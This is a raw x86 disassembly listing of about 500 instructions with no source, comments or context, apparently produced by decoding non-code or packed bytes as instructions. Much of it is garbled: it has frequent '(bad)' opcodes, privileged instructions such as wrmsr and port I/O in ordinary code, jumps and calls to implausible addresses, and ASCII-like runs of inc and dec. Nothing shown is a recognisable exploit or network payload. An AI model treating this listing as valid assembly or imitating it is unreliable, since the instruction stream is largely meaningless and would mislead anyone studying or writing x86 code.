  426d3e:	dec    edx
  426d3f:	imul   esi,DWORD PTR [ecx+0x56],0x54695055
  426d46:	dec    esi
  426d47:	inc    edx
  426d48:	dec    esi
  426d49:	imul   eax,DWORD PTR [eax],0x0
	...
  426d5c:	add    BYTE PTR [eax],al
  426d5e:	push   0x73
  426d60:	dec    eax
  426d61:	inc    edx
  426d62:	outs   dx,BYTE PTR ds:[esi]
  426d63:	jno    0x426ddf
  426d65:	inc    ecx
  426d66:	dec    ebx
  426d67:	jno    0x426de2
  426d69:	imul   ecx,DWORD PTR [edx+0x73],0x7a
  426d6d:	je     0x426dbe
  426d6f:	jo     0x426dc8
  426d71:	dec    edx
  426d72:	ins    BYTE PTR es:[edi],dx
  426d73:	popa   
  426d74:	inc    ecx
  426d75:	inc    ebx
  426d76:	ja     0x426dbe
  426d78:	inc    ebx
  426d79:	add    BYTE PTR gs:[eax],al
  426d7c:	push   eax
  426d7d:	push   esi
  426d7e:	dec    ebp
  426d7f:	popa   
  426d80:	pop    eax
  426d81:	addr16 dec edi
  426d83:	popa   
  426d84:	outs   dx,BYTE PTR ds:[esi]
  426d85:	pop    edx
  426d86:	ins    BYTE PTR es:[edi],dx
  426d87:	inc    edi
  426d88:	add    BYTE PTR [eax],al
  426d8a:	dec    ebp
  426d8b:	push   ebp
  426d8c:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  426d92:	mov    esp,ebp
  426d94:	or     al,ah
  426d96:	dec    ebp
  426d97:	add    bh,al
  426d99:	add    BYTE PTR [eax],cl
  426d9b:	add    BYTE PTR [eax],al
  426d9d:	mov    DWORD PTR [eax],0x3ef44545
  426da3:	cmp    BYTE PTR [eax],al
  426da5:	test   DWORD PTR [ebx-0x34070b64],ecx
  426dab:	(bad)  
  426dac:	enter  0x4d45,0xb8
  426db0:	mov    edi,DWORD PTR [ecx]
  426db2:	hlt    
  426db3:	test   ebx,ecx
  426db5:	pushf  
  426db6:	enter  0x4df8,0x8b
  426dba:	mov    DWORD PTR [ebp+0x8],0x894708
  426dc1:	inc    ebp
  426dc2:	mov    ebp,0xff8bfffc
  426dc7:	dec    ebp
  426dc8:	mov    ch,0xf4
  426dca:	call   DWORD PTR [ebx-0x1]
  426dcd:	mov    ebx,0x8005022
  426dd2:	call   DWORD PTR [ecx+0x8]
  426dd5:	pop    es
  426dd6:	jmp    0xb8:0x9cb4533
  426ddd:	cwde   
  426dde:	mov    esi,DWORD PTR [edx-0xc]
  426de1:	xor    al,bl
  426de3:	add    BYTE PTR [eax+0x3c83203],bl
  426de9:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  426def:	mov    eax,DWORD PTR [ebx-0xb87b3]
  426df5:	xor    eax,DWORD PTR [eax]
  426df7:	retf   
  426df8:	ret    
  426df9:	add    eax,esi
  426dfb:	enter  0x8945,0x64
  426dff:	dec    ebp
  426e00:	sbb    ah,cl
  426e02:	add    BYTE PTR [ebx-0xb87b277],cl
  426e08:	dec    DWORD PTR [ebx-0xbcfb275]
  426e0e:	test   DWORD PTR [ebx],esi
  426e10:	dec    ebx
  426e12:	inc    DWORD PTR [ebx]
  426e14:	inc    eax
  426e15:	enter  0x8989,0x64
  426e19:	(bad)  
  426e1a:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  426e1e:	cld    
  426e1f:	dec    DWORD PTR [ebp-0xa90001]
  426e25:	push   edi
  426e26:	mov    BYTE PTR [edx+0x1],ch
  426e29:	and    BYTE PTR [eax],al
  426e2b:	pop    ecx
  426e2c:	inc    ebp
  426e2d:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  426e33:	push   0xffffff89
  426e35:	pop    ecx
  426e36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426e37:	dec    ebp
  426e38:	add    BYTE PTR [ecx+0x45fc088b],cl
  426e3e:	jne    0x426e88
  426e40:	lea    eax,[eax]
  426e42:	fs (bad) 
  426e44:	dec    DWORD PTR [eax]
  426e46:	mov    DWORD PTR [eax],eax
  426e48:	test   al,0x0
  426e4a:	add    BYTE PTR [ebp-0x18],cl
  426e4d:	xor    ebp,DWORD PTR [edx]
  426e4f:	add    eax,DWORD PTR [eax]
  426e51:	mov    eax,eax
  426e53:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  426e5a:	inc    ebp
  426e5b:	mov    DWORD PTR [ebx+0x459408],ecx
  426e61:	popa   
  426e62:	mov    esp,DWORD PTR [ebp-0x75]
  426e65:	(bad)  
  426e66:	cld    
  426e67:	inc    eax
  426e68:	cmp    bh,0x1
  426e6b:	lea    eax,[eax]
  426e6d:	and    BYTE PTR [eax],al
  426e6f:	inc    DWORD PTR [ecx-0x18]
  426e72:	mov    ecx,DWORD PTR [ebx]
  426e74:	cld    
  426e75:	add    BYTE PTR [ecx+0x75014d],cl
  426e7b:	(bad)  
  426e7c:	xchg   ebp,eax
  426e7d:	sar    bh,1
  426e7f:	inc    eax
  426e80:	inc    DWORD PTR [eax]
  426e82:	mov    eax,DWORD PTR [ebp-0x4]
  426e85:	xor    edx,DWORD PTR [edx+0x7201be]
  426e8b:	add    BYTE PTR [edx],dl
  426e8d:	(bad)  
  426e8e:	nop
  426e8f:	inc    ebp
  426e90:	add    BYTE PTR [ebx-0x5afb0c00],cl
  426e96:	mov    al,0xff
  426e98:	add    bh,bh
  426e9a:	add    BYTE PTR [ebx],dh
  426e9c:	inc    DWORD PTR [ebx]
  426e9e:	sbb    al,0x89
  426ea0:	jne    0x426e7e
  426ea2:	mov    esp,DWORD PTR [ecx+0x4500fc]
  426ea8:	mov    eax,DWORD PTR [ebp-0xff0048]
  426eae:	mov    DWORD PTR [eax-0x70],0xee70ed89
  426eb5:	inc    DWORD PTR [ebp-0x75]
  426eb8:	fisttp QWORD PTR [eax+ebp*8]
  426ebb:	test   DWORD PTR [esi-0x1],esp
  426ebe:	inc    ebp
  426ebf:	(bad)  
  426ec0:	aas    
  426ec1:	inc    ebp
  426ec2:	(bad)  
  426ec3:	lea    edi,[eax+edi*2-0x1]
  426ec7:	inc    edi
  426ec9:	mov    DWORD PTR ds:0x8000c7a0,edi
  426ecf:	mov    ebp,esi
  426ed1:	cld    
  426ed2:	in     al,0x8d
  426ed4:	inc    ebp
  426ed5:	(bad)  
  426ed6:	call   0xc7cb4eda
  426edb:	add    DWORD PTR [eax-0x11ba1500],ecx
  426ee1:	inc    DWORD PTR [ebp-0x4]
  426ee4:	out    0x8d,eax
  426ee6:	aas    
  426ee7:	(bad)  
  426ee8:	call   0xca99ec
  426eed:	add    DWORD PTR [ebx-0x7f570400],ecx
  426ef3:	add    BYTE PTR [ecx],al
  426ef5:	test   DWORD PTR [eax],eax
  426ef7:	wrmsr  
  426ef9:	jae    0x426ee8
  426efb:	add    BYTE PTR [eax],al
  426efd:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  426f03:	add    esp,edi
  426f05:	add    BYTE PTR [eax+0x450108],al
  426f0b:	mov    edi,DWORD PTR [ebp-0x6c]
  426f0e:	add    DWORD PTR [eax],0x4
  426f11:	mov    eax,DWORD PTR [ebp+0x3]
  426f14:	mov    edi,DWORD PTR [esp+edi*8]
  426f17:	dec    ebp
  426f18:	nop
  426f19:	mov    eax,DWORD PTR [ecx]
  426f1b:	fadd   DWORD PTR [eax]
  426f1d:	add    BYTE PTR [esi],al
  426f1f:	lea    eax,[eax]
  426f21:	pusha  
  426f22:	push   eax
  426f23:	inc    DWORD PTR [ebp+0x52]
  426f26:	call   DWORD PTR [ebp-0x7b]
  426f29:	mov    esi,DWORD PTR [ebp-0x74]
  426f2c:	mov    eax,DWORD PTR [eax]
  426f2e:	cld    
  426f2f:	mov    eax,DWORD PTR [eax+0x880103]
  426f35:	add    BYTE PTR [ebp+0x6a],bh
  426f38:	cmp    edi,0x10
  426f3b:	mov    WORD PTR [ebp+0x0],es
  426f3e:	mov    edx,DWORD PTR [edx-0x4]
  426f41:	push   ecx
  426f42:	nop
  426f43:	inc    DWORD PTR [ecx]
  426f45:	cld    
  426f46:	add    BYTE PTR [ebp-0x24],bh
  426f49:	mov    eax,DWORD PTR [eax]
  426f4b:	cld    
  426f4c:	push   eax
  426f4d:	nop
  426f4e:	inc    ebp
  426f4f:	add    edi,edi
  426f51:	add    BYTE PTR [ebx+0x4de4f445],cl
  426f57:	in     al,dx
  426f58:	xor    eax,edi
  426f5a:	add    edx,DWORD PTR [ebx+edi*1+0x36e70feb]
  426f61:	mov    DWORD PTR [eax],0xb8788b98
  426f67:	test   ebx,eax
  426f69:	jmp    FWORD PTR [eax-0x1]
  426f6c:	int    0xed
  426f6e:	sub    esp,eax
  426f70:	add    eax,DWORD PTR [ebp-0x30]
  426f73:	fild   WORD PTR [ebp+0x3f]
  426f76:	cmp    eax,edi
  426f78:	je     0xca434f9a
  426f7e:	mov    DWORD PTR [ebp-0x28],0xe300f3
  426f85:	(bad)  
  426f86:	jne    0x426f14
  426f88:	mov    ebx,ebp
  426f8a:	cld    
  426f8b:	js     0x426fd2
  426f8d:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  426f93:	inc    ebp
  426f94:	call   0xea9924
  426f99:	add    BYTE PTR [ebx-0x7f170301],cl
  426f9f:	add    DWORD PTR es:[eax],eax
  426fa2:	add    al,al
  426fa4:	xor    BYTE PTR [eax+0x41],dl
  426fa7:	inc    ebp
  426fa8:	add    BYTE PTR [ebx+0xfcd88b],cl
  426fae:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  426fb4:	add    DWORD PTR [ecx+0x458be845],ecx
  426fba:	fmul   DWORD PTR [ebx+0x8bb800]
  426fc0:	cld    
  426fc1:	call   0xd79a86
  426fc6:	dec    DWORD PTR [ebx+0x1090e8ff]
  426fcc:	add    al,al
  426fce:	push   eax
  426fcf:	es inc ebp
  426fd1:	inc    ebp
  426fd2:	mov    ecx,DWORD PTR [ebx+0xd89c]
  426fd8:	dec    DWORD PTR [ebx-0x3ff70301]
  426fde:	mov    DWORD PTR gs:[eax],eax
  426fe1:	call   0x8b6ab5a6
  426fe6:	inc    ebp
  426fe7:	mov    eax,0xe8d8008b
  426fec:	add    BYTE PTR [ecx],ch
  426fee:	mov    eax,DWORD PTR [eax]
  426ff0:	cld    
  426ff1:	mov    eax,eax
  426ff3:	call   0x462a804d
  426ff8:	sub    DWORD PTR [ebx-0x3c743000],ecx
  426ffe:	cld    
  426fff:	mov    BYTE PTR [eax+0x8401c1],0x1
  427006:	xor    BYTE PTR [eax],al
  427008:	push   edi
  427009:	inc    ebp
  42700a:	mov    DWORD PTR [ebx],esi
  42700c:	in     al,0xb9
  42700e:	inc    ebp
  42700f:	lea    ecx,[ebx-0x3c370301]
  427015:	dec    ebp
  427016:	cwde   
  427017:	mov    esi,DWORD PTR [edx]
  427019:	or     BYTE PTR [ebx],al
  42701b:	ror    DWORD PTR [ebp-0xfebf79],0x0
  427022:	call   0x42996c
  427027:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  42702d:	jge    0x427062
  42702f:	mov    eax,DWORD PTR [ebx]
  427031:	cld    
  427032:	lea    edx,[eax+0xff0120]
  427038:	call   0x4299cc
  42703d:	push   eax
  42703e:	inc    DWORD PTR [ebp-0x1c]
  427041:	mov    ecx,DWORD PTR [ebp-0x58]
  427044:	xor    eax,DWORD PTR [eax]
  427046:	add    edi,edi
  427048:	cmp    ebp,eax
  42704a:	jne    0x427072
  42704c:	mov    DWORD PTR [eax],0x8b004dd8
  427052:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  427059:	mov    eax,ebx
  42705b:	cld    
  42705c:	test   BYTE PTR [eax+0x320198],bh
  427062:	mov    DWORD PTR [ebp+0x8],esi
  427065:	xor    eax,DWORD PTR [ebp-0x73]
  427068:	test   DWORD PTR [esp+esi*2-0x1],edi
  42706c:	mov    ebp,eax
  42706e:	mov    eax,0x33004d29
  427073:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  427079:	add    DWORD PTR [eax],eax
  42707b:	add    BYTE PTR [ebp+0x30],al
  42707e:	mov    edx,DWORD PTR [edi-0x48]
  427081:	add    ebx,0xffffffe4
  427084:	push   0x2b74cd85
  427089:	mov    eax,DWORD PTR [ebx]
  42708b:	cld    
  42708c:	sar    BYTE PTR [eax+0x3b0145],1
  427092:	pcmpeqw mm4,mm6
  427095:	xor    edi,edi
  427097:	lea    ecx,[ebx-0x239c7470]
  42709d:	add    BYTE PTR [ebp+0x50],cl
  4270a0:	cmp    eax,DWORD PTR [ebp+0x75]
  4270a3:	mov    ebp,DWORD PTR [eax-0x68]
  4270a6:	test   DWORD PTR [eax],eax
  4270a8:	clc    
  4270a9:	push   DWORD PTR [ebp-0x1]
  4270ac:	lea    ecx,[eax]
  4270ae:	int3   
  4270af:	inc    ebp
  4270b0:	call   0xfaa140
  4270b5:	jne    0x4270af
  4270b7:	xor    edi,DWORD PTR [ebp-0x41]
  4270ba:	jmp    0x42712e
  4270bc:	mov    eax,DWORD PTR [eax]
  4270be:	mov    eax,0x339545c7
  4270c3:	inc    DWORD PTR [ebx]
  4270c5:	push   DWORD PTR [ecx]
  4270c7:	aaa    
  4270c8:	mov    eax,DWORD PTR [eax]
  4270ca:	jmp    0x42711c
  4270cc:	mov    eax,DWORD PTR [ebp-0x3c]
  4270cf:	mov    eax,eax
  4270d1:	cld    
  4270d2:	clc    
  4270d3:	ret    
  4270d4:	test   bh,al
  4270d6:	pop    es
  4270d7:	xchg   ebp,eax
  4270d8:	add    bh,bh
  4270da:	inc    ebp
  4270db:	dec    DWORD PTR [edi]
  4270dd:	and    DWORD PTR [ebx],ebp
  4270df:	add    BYTE PTR [eax],al
  4270e1:	push   eax
  4270e2:	jbe    0x427139
  4270e4:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  4270ea:	or     al,0xcf
  4270ec:	inc    eax
  4270ed:	enter  0x745,0x72
  4270f1:	inc    ebp
  4270f2:	mov    eax,DWORD PTR [ecx]
  4270f4:	int3   
  4270f5:	add    BYTE PTR [ebp-0x75],al
  4270f8:	cmp    BYTE PTR [eax+0x33c74d9c],bh
  4270fe:	ror    BYTE PTR [ebp+0x72f80885],1
  427104:	inc    ebp
  427105:	add    BYTE PTR [ebx-0x3c7423bb],cl
  42710b:	fadd   st,st(6)
  42710d:	rol    BYTE PTR [ebp+0x12],0x8b
  427111:	inc    ebp
  427112:	fmul   QWORD PTR [ebx-0x3c39233d]
  427118:	inc    ebp
  427119:	test   bh,al
  42711b:	cwde   
  42711c:	clc    
  42711d:	xor    al,BYTE PTR [ebp+0x45dcf889]
  427123:	inc    ebp
  427124:	cmp    dh,BYTE PTR [ebx]
  427126:	pushf  
  427127:	mov    ecx,0xffb48dc7
  42712c:	test   eax,ecx
  42712e:	clc    
  42712f:	dec    ebp
  427130:	inc    ebp
  427131:	mov    edi,DWORD PTR [eax+ecx*1]
  427134:	pushf  
  427135:	rol    edi,0x86
  427138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427139:	inc    BYTE PTR [ebp+0x45f7f8ff]
  42713f:	inc    ebp
  427140:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x18e8c8c7]
  427148:	test   DWORD PTR [eax],edi
  42714a:	clc    
  42714b:	pushf  
  42714c:	inc    ebp
  42714d:	dec    DWORD PTR [ebx-0x3cba0f04]
  427153:	push   eax
  427154:	(bad)  
  427155:	cld    
  427156:	jge    0x427158
  427158:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  42715e:	add    BYTE PTR [ebx],dl
  427160:	jmp    0xcd72b2
  427165:	les    eax,FWORD PTR [ebp-0x35]
  427168:	mov    ecx,esi
  42716a:	lock or al,cl
  42716d:	clc    
  42716e:	inc    ebp
  42716f:	add    esi,DWORD PTR [ebx]
  427171:	jge    0x427176
  427173:	xor    edi,DWORD PTR [ebx]
  427175:	cmp    ecx,DWORD PTR [edi]
  427177:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  42717c:	mov    edi,DWORD PTR [ecx]
  42717e:	test   al,0xcc
  427180:	dec    ebp
  427181:	test   BYTE PTR [ebx],dh
  427183:	pop    es
  427184:	xor    eax,DWORD PTR [eax]
  427186:	add    ecx,DWORD PTR [esi]
  427188:	add    ecx,eax
  42718a:	psraw  mm0,mm1
  42718d:	sub    BYTE PTR [ebp+0x38],cl
  427190:	mov    edi,DWORD PTR [ebx]
  427192:	lock int3 
  427194:	shl    edx,1
  427196:	rol    BYTE PTR [ebp+0xc],1
  427199:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4271a0:	jmp    0x7b71ea
  4271a5:	pushf  
  4271a6:	inc    ebp
  4271a7:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4271ad:	xor    ecx,ebx
  4271af:	add    ecx,esi
  4271b1:	mov    esi,eax
  4271b3:	enter  0x45af,0x8b
  4271b7:	xor    ecx,eax
  4271b9:	add    edx,DWORD PTR [ebp-0x77]
  4271bc:	sub    ecx,DWORD PTR [eax]
  4271be:	cmp    eax,DWORD PTR [ebp+0x77]
  4271c1:	fmul   DWORD PTR [ebx-0x76385764]
  4271c7:	test   al,0x0
  4271c9:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  4271cf:	cmp    esi,DWORD PTR [ebx]
  4271d1:	pushf  
  4271d2:	xor    eax,edi
  4271d4:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  4271db:	inc    ebp
  4271dc:	dec    ebp
  4271dd:	cmp    eax,0xc7f09c8b
  4271e2:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  4271e9:	inc    ebp
  4271ea:	jmp    0x42722b
  4271ec:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  4271f3:	dec    ebp
  4271f4:	xor    esi,DWORD PTR [ebx]
  4271f6:	add    eax,DWORD PTR [ebx]
  4271f8:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  4271fe:	dec    ebp
  4271ff:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  427205:	out    dx,eax
  427206:	rol    BYTE PTR [eax],1
  427208:	add    eax,0xebc8458b
  42720d:	dec    ebp
  42720e:	mov    ebp,DWORD PTR [ebx]
  427210:	mov    esp,0x33f84d8b
  427215:	ret    
  427216:	xor    eax,esi
  427218:	add    ecx,eax
  42721a:	add    eax,DWORD PTR [edx+0xc1010f]
  427220:	dec    ebp
  427221:	inc    ebp
  427222:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  427228:	ror    bl,1
  42722a:	add    eax,0xebc645ce
  42722f:	scas   eax,DWORD PTR es:[edi]
  427230:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  427236:	xor    ebp,DWORD PTR [ebx]
  427238:	xor    edi,DWORD PTR [ebx]
  42723a:	add    esi,DWORD PTR [edi+0x3]
  42723d:	mov    ecx,DWORD PTR [edi]
  42723f:	clc    
  427240:	rol    ebx,0x4d
  427243:	(bad)  
  427244:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  42724b:	mov    ah,0x45
  42724d:	dec    ebp
  42724e:	jbe    0x427283
  427250:	mov    esi,DWORD PTR [ebx]
  427252:	call   0x3345bf5a
  427257:	rdpmc  
  427259:	rol    DWORD PTR [ebx],0x4d
  42725c:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  427262:	inc    ebp
  427263:	ror    BYTE PTR [ebx+0x45450808],1
  427269:	jmp    0x10a72f9
  42726e:	inc    ebp
  42726f:	inc    ebp
  427270:	(bad)  
  427271:	mov    ebx,eax
  427273:	clc    
  427274:	test   ebx,eax
  427276:	clc    
  427277:	retf   
  427278:	inc    ebp
  427279:	into   
  42727a:	mov    esi,0x8b85afec
  427280:	clc    
  427281:	enter  0x5545,0x3a
  427285:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  42728c:	ret    
  42728d:	mov    ah,0xc6
  42728f:	addr16 push 0x338b4545
  427295:	clc    
  427296:	add    eax,ebx
  427298:	loopne 0x427265
  42729a:	dec    ebp
  42729b:	into   
  42729c:	mov    al,dh
  42729e:	or     BYTE PTR [edi-0x37ff748e],ch
  4272a4:	inc    ebp
  4272a5:	push   ebp
  4272a6:	mov    ebp,DWORD PTR [ebx]
  4272a8:	in     al,dx
  4272a9:	cmp    eax,ebx
  4272ab:	ja     0x4272f2
  4272ad:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  4272b3:	inc    ebp
  4272b4:	cwde   
  4272b5:	mov    esi,DWORD PTR [edx]
  4272b7:	clc    
  4272b8:	mov    bl,al
  4272ba:	xlat   BYTE PTR ds:[ebx]
  4272bb:	retf   
  4272bc:	inc    ebp
  4272bd:	into   
  4272be:	mov    eax,esi
  4272c0:	in     al,dx
  4272c1:	scas   eax,DWORD PTR es:[edi]
  4272c2:	retf   
  4272c3:	mov    ecx,DWORD PTR [ebp-0x38]
  4272c6:	mov    edx,DWORD PTR [ebp-0x24]
  4272c9:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8868]
  4272d0:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  4272d7:	mov    eax,DWORD PTR [ebx]
  4272d9:	clc    
  4272da:	loopne 0x42729f
  4272dc:	push   ebp
  4272dd:	retf   
  4272de:	mov    dh,al
  4272e0:	adc    esi,ecx
  4272e2:	jb     0x427293
  4272e4:	add    BYTE PTR [ebx+0x558bc845],cl
  4272ea:	in     al,dx
  4272eb:	sub    eax,ebx
  4272ed:	cmp    ecx,ebx
  4272ef:	mov    eax,esi
  4272f1:	mov    esp,0x45af03ce
  4272f6:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  4272fc:	mov    eax,ebx
  4272fe:	in     al,dx
  4272ff:	into   
  427300:	dec    ebp
  427301:	(bad)  
  427302:	xor    ebp,DWORD PTR [edi+0x80f8903]
  427308:	rol    DWORD PTR [ebp+0x4d],0x89
  42730c:	xor    esp,esp
  42730e:	sub    eax,DWORD PTR [ebp-0x75]
  427311:	add    ebp,esp
  427313:	mov    al,0x55
  427315:	inc    ebp
  427316:	xor    edi,DWORD PTR [eax]
  427318:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  42731f:	inc    ebp
  427320:	xor    edi,DWORD PTR [ecx]
  427322:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  427329:	test   DWORD PTR [eax],eax
  42732b:	clc    
  42732c:	enter  0x8645,0x33
  427330:	inc    DWORD PTR [ebx]
  427332:	(bad)  
  427333:	jmp    0x42737a
  427335:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  42733b:	inc    ebp
  42733c:	(bad)  
  42733d:	mov    ebp,DWORD PTR [edi-0x277b7424]
  427343:	cwde   
  427344:	retf   
  427345:	xor    al,cl
  427347:	mov    BYTE PTR [ebp+0xb],cl
  42734a:	lea    eax,[ebp+0x8]
  42734d:	xor    esi,DWORD PTR [edx+0x3]
  427350:	add    al,ah
  427352:	inc    ebp
  427353:	dec    ebp
  427354:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  42735a:	push   0x2b45cd00
  42735f:	mov    al,BYTE PTR [ebx]
  427361:	or     esi,eax
  427363:	dec    ebp
  427364:	inc    ebp
  427365:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  42736b:	push   ebp
  42736c:	(bad)  
  42736d:	mov    BYTE PTR [edi+0xf723b11],ch
  427373:	add    ch,ch
  427375:	inc    ebp
  427376:	dec    DWORD PTR [ebx-0x34332775]
  42737c:	add    al,0x4d
  42737e:	inc    ebp
  42737f:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  427385:	cwde   
  427386:	add    DWORD PTR [edx],esi
  427388:	add    BYTE PTR [ebx+0x4d00c000],cl
  42738e:	push   DWORD PTR [ebx]
  427390:	int3   
  427391:	xor    eax,DWORD PTR [eax]
  427393:	add    edx,DWORD PTR [eax+0x3]
  427396:	mov    DWORD PTR [edi],ecx
  427398:	call   0x4288345e
  42739d:	mov    DWORD PTR [ebp-0x20],esp
  4273a0:	add    BYTE PTR [ebp+0x7d],al
  4273a3:	mov    eax,DWORD PTR [eax]
  4273a5:	in     al,0x15
  4273a7:	ret    
  4273a8:	iret   
  4273a9:	(bad)  
  4273aa:	enter  0x14af,0x8b
  4273ae:	(bad)  
  4273af:	in     al,dx
  4273b0:	or     bl,cl
  4273b2:	adc    cl,al
  4273b4:	push   ebp
  4273b5:	dec    ebp
  4273b6:	inc    eax
  4273b7:	mov    edx,DWORD PTR [ebp-0x20]
  4273ba:	jb     0x427387
  4273bc:	mov    ecx,esi
  4273be:	cld    
  4273bf:	scas   eax,DWORD PTR es:[edi]
  4273c0:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  4273c7:	mov    BYTE PTR [eax],0x8c
  4273ca:	push   0xffffff98
  4273cc:	push   edi
  4273cd:	xor    dl,BYTE PTR [eax+0x3b]
  4273d0:	mov    ecx,DWORD PTR [edi]
  4273d2:	call   0x8c41b935
  4273d7:	mov    eax,eax
  4273d9:	in     al,dx
  4273da:	jge    0x427429
  4273dc:	mov    DWORD PTR [ebx],esi
  4273de:	int3   
  4273df:	add    eax,DWORD PTR [ebp+0xf]
  4273e2:	xor    eax,ecx
  4273e4:	(bad)  
  4273e5:	dec    ebp
  4273e6:	pushf  
  4273e7:	xor    ecx,eax
  4273e9:	add    edi,DWORD PTR [edi]
  4273eb:	mov    eax,DWORD PTR [ebp-0x38]
  4273ee:	rol    BYTE PTR [eax+edx*8-0x14cdfc68],1
  4273f5:	mov    DWORD PTR [edx+0xf4505c8],ecx
  4273fb:	xor    edx,DWORD PTR [ecx+edi*4]
  4273fe:	or     BYTE PTR [ebp-0x371600bd],0xf
  427405:	dec    ebp
  427406:	leave  
  427407:	mov    edx,ecx
  427409:	rol    BYTE PTR [ebp+0x330155],1
  42740f:	add    ecx,DWORD PTR [ebp+0xf]
  427412:	xor    eax,edx
  427414:	(bad)  
  427415:	ror    DWORD PTR [eax],0x86
  427418:	jb     0x427417
  42741a:	add    bh,bh
  42741c:	clc    
  42741d:	inc    ebp
  42741e:	jb     0x42748a
  427420:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  427426:	cmp    BYTE PTR [ebx+0xc7d89c],cl
  42742c:	shr    BYTE PTR [eax-0x3d],0x30
  427430:	clc    
  427431:	add    BYTE PTR [ebp+0x75],al
  427434:	cmp    BYTE PTR [edx-0x64],ch
  427437:	inc    edi
  427439:	adc    al,0xe8
  42743b:	inc    ebp
  42743c:	test   DWORD PTR [ebp-0x7cba8b08],eax
  427442:	mov    ecx,DWORD PTR [eax]
  427444:	cld    
  427445:	or     DWORD PTR [ebp-0x34],0x33
  427449:	jbe    0x42744e
  42744b:	mov    edx,DWORD PTR [ecx+0x2b]
  42744e:	dec    ebp
  42744f:	mov    cl,BYTE PTR [ebx+0x45d801]
  427455:	mov    BYTE PTR [ebx],dh
  427457:	mov    eax,DWORD PTR [ebx]
  427459:	or     BYTE PTR [ecx+0x3b],dl
  42745c:	dec    ebp
  42745d:	int3   
  42745e:	xor    ebp,edi
  427460:	add    eax,DWORD PTR [ebp+0x51]
  427463:	mov    ecx,DWORD PTR [ebp-0x28]
  427466:	xor    eax,DWORD PTR [eax]
  427468:	add    ebp,DWORD PTR [eax+0x51]
  42746b:	adc    BYTE PTR [eax+0x0],0x8b
  42746f:	add    BYTE PTR [ebx+0x4d18fcff],cl
  427475:	inc    ebp
  427476:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  42747c:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  427482:	dec    ebp
  427483:	mov    esi,DWORD PTR [ebx]
  427485:	hlt    
  427486:	add    eax,ebx
  427488:	push   ecx
  427489:	inc    ebp
  42748a:	dec    ebp
  42748b:	sar    bh,1
  42748d:	shl    ah,1
  42748f:	(bad)  
  427490:	retf   
  427491:	mov    al,ds:0xc5ff3dce
  427496:	adc    al,0xc6
  427498:	inc    ebp
  427499:	and    eax,0x9c0f4c85
  42749e:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4274a5:	cmp    BYTE PTR [ebx+0x3b],0x0
  4274a9:	mov    dh,0xc7
  4274ab:	cmp    eax,eax
  4274ad:	jne    0x45436cf9
  4274b3:	mov    edi,DWORD PTR [edx]
  4274b5:	mov    eax,0x848bcb9c
  4274ba:	rcr    BYTE PTR [eax-0x7c7fcd0f],0x68
  4274c1:	or     BYTE PTR [edi],cl
  4274c3:	(bad)  
  4274c4:	dec    ebp
  4274c5:	inc    edi
  4274c6:	add    bh,0x50
  4274c9:	or     cl,ch
  4274cb:	test   DWORD PTR [eax+0x4d4501f8],ecx
  4274d1:	xchg   DWORD PTR [eax-0x1638af64],eax
  4274d7:	mov    esp,0xf802b588
  4274dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4274dd:	inc    ebp
  4274de:	(bad)  
  4274df:	cmp    al,0xff
  4274e1:	pushf  
  4274e2:	or     DWORD PTR [ecx+0x45ffe474],0x0
  4274e9:	mov    ecx,DWORD PTR [ebp-0x340018]
  4274ef:	into   
  4274f0:	dec    DWORD PTR [ebx-0x7f72431c]
  4274f6:	push   0x5000ff01
  4274fb:	retf   
  4274fc:	inc    ebp
  4274fd:	into   
  4274fe:	dec    DWORD PTR [ebx-0x343f3ff4]
  427504:	push   eax
  427505:	into   
  427506:	call   0x4a7996
  42750b:	retf   
  42750c:	add    dh,cl
  42750e:	add    bh,bh
  427510:	mov    DWORD PTR [eax+ecx*1],edx
  427513:	clc    
  427514:	inc    ebp
  427515:	inc    ebp
  427516:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  42751c:	push   0x1
  42751e:	push   edi
  42751f:	add    BYTE PTR [eax-0x35],dl
  427522:	mov    ecx,esi
  427524:	cld    
  427525:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  42752b:	into   
